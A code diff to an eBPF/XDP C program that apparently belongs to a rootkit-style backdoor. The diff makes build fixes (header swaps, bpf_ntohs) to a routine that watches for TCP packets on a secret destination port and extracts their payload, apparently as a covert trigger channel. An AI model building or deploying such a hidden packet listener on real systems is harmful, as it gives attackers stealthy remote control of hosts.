@@ -1,5 +1,5 @@
 //Linux system includes
-#include <unistd.h>
+/*#include <unistd.h>
 #include <stdbool.h>
 #include <linux/tcp.h>
 #include <linux/udp.h>
@@ -13,13 +13,16 @@
 #include <arpa/inet.h>
 #include <linux/if_ether.h>
 #include <linux/ip.h>
-#include <linux/udp.h>
+#include <linux/udp.h>*/
+
+
+#include "newnewvmlinux.h"
 
 //BPF & libbpf dependencies
-#include <linux/bpf.h>
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
 #include <bpf/bpf_core_read.h>
+#include <bpf/bpf_endian.h>
 
 //User-kernel dependencies
 #include "../user/include/xdp_filter.h"
@@ -36,6 +39,7 @@
 #include "include/bpf/fs.h"
 
 char LICENSE[] SEC("license") = "Dual BSD/GPL";
+#define ETH_ALEN 6
 
 //Ethernet frame struct
 struct eth_hdr {
@@ -83,11 +87,11 @@ int xdp_receive(struct xdp_md *ctx){
     }
 
     if (get_tcp_dest_port(tcp) != SECRET_PACKET_DEST_PORT){
-        bpf_printk("E %i\n", ntohs(tcp->dest));
+        bpf_printk("E %i\n", bpf_ntohs(tcp->dest));
         return XDP_PASS;
     }
 
-    payload_size = ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
+    payload_size = bpf_ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
     payload = (void *)tcp + tcp->doff*4;
 
     // We use "size - 1" to account for the final '\0', but depending on the program use
@@ -142,7 +146,7 @@ int xdp_receive(struct xdp_md *ctx){
             return XDP_PASS;
         }
 
-        payload_size = ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
+        payload_size = bpf_ntohs(ip->tot_len) - (tcp->doff * 4) - (ip->ihl * 4);
         payload = (void *)tcp + tcp->doff*4;
         
         //Quite a trick to avoid the verifier complaining when it's clear we are OK with the payload
